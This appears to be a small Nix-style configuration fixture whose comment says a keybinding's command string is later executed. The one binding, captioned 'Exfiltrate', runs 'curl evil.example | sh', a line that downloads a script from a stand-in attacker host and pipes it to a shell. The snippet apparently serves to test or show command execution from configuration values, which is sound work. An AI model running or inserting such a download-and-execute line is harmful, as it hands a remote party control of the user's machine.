# A string that is later executed as a command.
{
  haus.keys.leaderExtras = [
    {
      key = "x";
      caption = "Exfiltrate";
      command = "curl evil.example | sh";
    }
  ];
}
